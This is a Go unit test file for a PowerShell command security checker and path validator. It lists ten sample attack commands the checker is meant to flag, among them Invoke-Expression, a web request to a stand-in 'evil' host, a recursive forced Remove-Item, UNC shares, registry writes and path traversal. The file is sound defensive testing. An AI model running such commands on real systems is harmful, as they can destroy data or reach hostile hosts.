// Package powershell — 安全检查与路径验证测试（T4，含 10 个攻击向量）。
package powershell

import (
	"path/filepath"
	"runtime"
	"testing"
)

func hasVS(vs []*SecurityViolation, id string) bool {
	for _, v := range vs {
		if v.CheckID == id {
			return true
		}
	}
	return false
}

// TestSecurityChecks_Count 验证检查项已注册。
func TestSecurityChecks_Count(t *testing.T) {
	if len(PSSecurityChecks) < 15 {
		t.Fatalf("expected >=15 PS security checks, got %d", len(PSSecurityChecks))
	}
}

// TestSecurityChecks_AttackVectors 10 个 PowerShell 攻击向量测试。
func TestSecurityChecks_AttackVectors(t *testing.T) {
	cases := []struct {
		name    string
		cmd     string
		checkID string
		crit    bool
	}{
		// 1. Invoke-Expression
		{"iex", `iex 'Get-Process'`, "PS_IEX", true},
		// 2. & 调用操作符
		{"call_operator", `& 'C:\bad.exe'`, "PS_CALL_OPERATOR", true},
		// 3. UNC 路径
		{"unc_path", `Get-Content \\evil\share\data`, "PS_UNC_PATH", true},
		// 4. 注册表路径
		{"registry", `Set-Item HKLM:\Software\X`, "PS_REGISTRY_PATH", true},
		// 5. 路径遍历
		{"path_traversal", `Get-Content ..\..\windows\win.ini`, "PS_PATH_TRAVERSAL", true},
		// 6. 破坏性 cmdlet
		{"destructive", `Remove-Item -Recurse -Force C:\x`, "PS_DESTRUCTIVE_CMDLET", false},
		// 7. 网络 cmdlet
		{"network", `Invoke-WebRequest http://evil/x`, "PS_NETWORK_CMDLET", false},
		// 8. 变量展开 $env:
		{"var_expansion", `Write-Host $env:PATH`, "PS_VAR_EXPANSION", false},
		// 9. New-Alias 混淆
		{"new_alias", `New-Alias -Name g -Value Get-Process`, "PS_NEW_ALIAS", false},
		// 10. 盘符绝对路径
		{"drive_path", `Get-Content C:\Windows\System32\drivers\etc\hosts`, "PS_DRIVE_PATH", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			vs := RunSecurityChecks(c.cmd)
			if !hasVS(vs, c.checkID) {
				t.Errorf("attack %q did not trigger %s; got: %+v", c.cmd, c.checkID, vs)
			}
			if c.crit && !HasCriticalViolation(vs) {
				t.Errorf("attack %q expected Critical, got none", c.cmd)
			}
		})
	}
}

// TestPathValidator UNC/遍历/越界拦截。
func TestPathValidator(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("跳过 Windows 特定测试（PowerShell 路径验证）")
	}
	workDir, _ := filepath.Abs("C:\\proj")
	v := NewPathValidator(workDir)

	// UNC 拦截
	if err := v.Validate(`\\evil\share`); err == nil {
		t.Error("expected UNC path rejected")
	}
	// 路径遍历
	if err := v.Validate(`..\..\secret`); err == nil {
		t.Error("expected traversal rejected")
	}
	// 注册表
	if err := v.Validate(`HKLM:\Software\X`); err == nil {
		t.Error("expected registry path rejected")
	}
	// 越界
	if err := v.Validate(`C:\Windows\system32`); err == nil {
		t.Error("expected out-of-workdir path rejected")
	}
	// 合法（工作目录内）
	if err := v.Validate(`subdir\file.txt`); err != nil {
		t.Errorf("expected in-workdir path accepted, got %v", err)
	}
}

// TestExtractPaths 参数化路径提取。
func TestExtractPaths(t *testing.T) {
	paths := ExtractPaths(`Copy-Item -Path "C:\a.txt" -Destination C:\b.txt`)
	if len(paths) < 2 {
		t.Fatalf("expected 2 paths, got %d: %v", len(paths), paths)
	}
}
